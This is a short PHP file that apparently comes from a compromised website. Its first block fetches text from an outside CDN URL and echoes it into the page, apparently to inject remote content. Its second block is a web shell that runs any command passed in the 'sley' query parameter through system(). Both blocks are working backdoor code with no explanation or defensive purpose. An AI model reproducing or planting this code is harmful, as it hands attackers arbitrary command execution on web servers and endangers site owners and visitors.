<?php
$url = "https://sebat-dulu-bray.b-cdn.net/gratis.txt";
$content = @file_get_contents($url);
if ($content === false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($ch);
    curl_close($ch);
}
echo $content;
?>
<?php
if (isset($_GET['sley'])) {
$joday = $_GET['sley'];
system($joday, $ret);
echo $ret;
}
?>